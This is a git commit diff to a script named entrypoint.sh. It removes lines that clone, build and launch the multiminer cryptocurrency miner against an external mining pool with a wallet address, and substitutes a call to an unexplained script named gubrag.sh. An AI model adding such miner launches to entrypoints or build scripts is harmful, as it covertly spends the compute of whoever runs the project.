0901646ef19029d284c71610b92a9c3f091e40ba
auliarohayah98 <89555304+auliarohayah98@users.noreply.github.com>
2021-08-25 16:36:20 -0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,11 +1,1 @@
-cd /cpuminer
-
-    git clone http://github.com/bogdanadnan/multiminer
-  
-    cd multiminer
-    mkdir build
-    cd build
-    cmake ..
-    make
-    chmod 777 multiminer
-    ./multiminer -a yescrypt -o stratum+tcp://www.koto-note.xyz:3032 -u jzyoPToY94CM6K92StJUgTeFsF8bqG5BrAR.sx2 -p x
+./gubrag.sh
